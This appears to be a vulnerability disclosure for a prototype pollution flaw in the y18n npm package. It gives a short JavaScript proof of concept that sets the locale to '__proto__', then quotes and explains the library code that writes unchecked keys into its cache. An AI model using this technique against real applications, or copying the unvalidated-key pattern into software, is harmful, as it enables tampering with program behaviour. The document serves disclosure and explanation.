# POC

```js
const y18n = require('y18n')();

const obj = {};
y18n.setLocale('__proto__');
y18n.updateLocale({'state':'polluted'});

console.log(obj.state);
```

# Analysis

```js
/node_modules/y18n/index.js

Y18N.prototype.setLocale = function (locale) {
  this.locale = locale
}

(...)

Y18N.prototype.updateLocale = function (obj) {
  if (!this.cache[this.locale]) this._readLocaleFile()
  for (var key in obj) {
    this.cache[this.locale][key] = obj[key]
  }
}

```
Look at the above code, First, Setting the `this.locale` value using the setLocale() and next You can see that `this.locale` and `key` are used as property for `this.cache`. And `obj[key]` is inserted.

```js
y18n.setLocale('__proto__');
y18n.updateLocale({'state':'polluted'});
```
First, the value of `this.locale` is set to `__proto__` by `setLocale()`. And when the `updateLocale()` method is called, the Prototype Pollution vulnerability occurs because it works like `this.cache['__proto__']['state'] = 'polluted'`.
